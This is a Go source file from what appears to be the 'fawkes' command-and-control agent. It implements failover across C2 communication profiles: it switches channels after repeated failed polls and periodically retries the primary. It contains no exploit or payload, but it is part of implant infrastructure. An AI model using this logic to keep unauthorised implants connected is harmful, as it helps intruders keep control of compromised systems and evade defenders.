package profiles

import (
	"fmt"
	"sync"
	"time"

	"fawkes/pkg/structs"
)

const (
	defaultFailoverThreshold = 5
	defaultRecoverySeconds   = 300
)

// FailoverManager implements Profile and provides ordered failover across multiple
// C2 profiles. When the active profile fails consecutively maxFailures times,
// it advances to the next profile in the chain and attempts checkin. A background
// recovery check periodically retries the primary profile once a backup is active.
type FailoverManager struct {
	profiles       []Profile
	names          []string
	current        int
	failures       int
	maxFailures    int
	recoveryPeriod time.Duration
	lastRecovery   time.Time
	mu             sync.Mutex
}

// NewFailoverManager creates a FailoverManager wrapping profiles in priority order.
// The first profile is primary. maxFailures is consecutive poll failures before switching.
// recoverySeconds is how often to retry the primary when a backup is active (0 = default 300s).
func NewFailoverManager(profiles []Profile, names []string, maxFailures, recoverySeconds int) *FailoverManager {
	if maxFailures <= 0 {
		maxFailures = defaultFailoverThreshold
	}
	if recoverySeconds <= 0 {
		recoverySeconds = defaultRecoverySeconds
	}
	return &FailoverManager{
		profiles:       profiles,
		names:          names,
		maxFailures:    maxFailures,
		recoveryPeriod: time.Duration(recoverySeconds) * time.Second,
	}
}

// Checkin tries profiles in order until one succeeds, activating the first successful one.
func (f *FailoverManager) Checkin(agent *structs.Agent) error {
	for i, p := range f.profiles {
		if err := p.Checkin(agent); err == nil {
			f.mu.Lock()
			f.current = i
			f.failures = 0
			f.mu.Unlock()
			return nil
		}
	}
	return fmt.Errorf("all %d C2 profiles failed initial checkin", len(f.profiles))
}

// GetTasking delegates to the current profile and rotates on persistent failures.
// Also attempts periodic recovery of the primary profile when a backup is active.
func (f *FailoverManager) GetTasking(agent *structs.Agent, socks []structs.SocksMsg) ([]structs.Task, []structs.SocksMsg, error) {
	f.tryRecovery(agent)

	f.mu.Lock()
	p := f.profiles[f.current]
	f.mu.Unlock()

	tasks, outSocks, err := p.GetTasking(agent, socks)
	if err != nil {
		f.mu.Lock()
		f.failures++
		shouldRotate := f.failures >= f.maxFailures && len(f.profiles) > 1
		nextIdx := (f.current + 1) % len(f.profiles)
		f.mu.Unlock()

		if shouldRotate {
			f.attemptSwitch(agent, nextIdx)
		}
		return nil, nil, err
	}

	f.mu.Lock()
	f.failures = 0
	f.mu.Unlock()
	return tasks, outSocks, nil
}

// PostResponse delegates to the current active profile.
func (f *FailoverManager) PostResponse(response structs.Response, agent *structs.Agent, socks []structs.SocksMsg) ([]byte, error) {
	f.mu.Lock()
	p := f.profiles[f.current]
	f.mu.Unlock()
	return p.PostResponse(response, agent, socks)
}

// GetCallbackUUID returns the UUID from the currently active profile.
func (f *FailoverManager) GetCallbackUUID() string {
	f.mu.Lock()
	p := f.profiles[f.current]
	f.mu.Unlock()
	return p.GetCallbackUUID()
}

// CurrentIndex returns the index of the currently active profile (0 = primary).
func (f *FailoverManager) CurrentIndex() int {
	f.mu.Lock()
	defer f.mu.Unlock()
	return f.current
}

// CurrentName returns the name of the currently active profile.
func (f *FailoverManager) CurrentName() string {
	f.mu.Lock()
	defer f.mu.Unlock()
	if f.current < len(f.names) {
		return f.names[f.current]
	}
	return fmt.Sprintf("profile[%d]", f.current)
}

// FailureCount returns the consecutive failure count for the current profile.
func (f *FailoverManager) FailureCount() int {
	f.mu.Lock()
	defer f.mu.Unlock()
	return f.failures
}

// tryRecovery attempts to reconnect to the primary profile if a backup is active
// and the recovery period has elapsed. Does not hold the lock during the network call.
func (f *FailoverManager) tryRecovery(agent *structs.Agent) {
	f.mu.Lock()
	if f.current == 0 || time.Since(f.lastRecovery) < f.recoveryPeriod {
		f.mu.Unlock()
		return
	}
	f.lastRecovery = time.Now()
	f.mu.Unlock()

	if err := f.profiles[0].Checkin(agent); err == nil {
		f.mu.Lock()
		f.current = 0
		f.failures = 0
		f.mu.Unlock()
	}
}

// attemptSwitch tries to checkin with the profile at nextIdx and switches if successful.
// Resets the failure counter regardless of outcome to prevent rapid switching loops.
func (f *FailoverManager) attemptSwitch(agent *structs.Agent, nextIdx int) {
	if err := f.profiles[nextIdx].Checkin(agent); err == nil {
		f.mu.Lock()
		f.current = nextIdx
		f.failures = 0
		f.mu.Unlock()
	} else {
		f.mu.Lock()
		f.failures = 0
		f.mu.Unlock()
	}
}
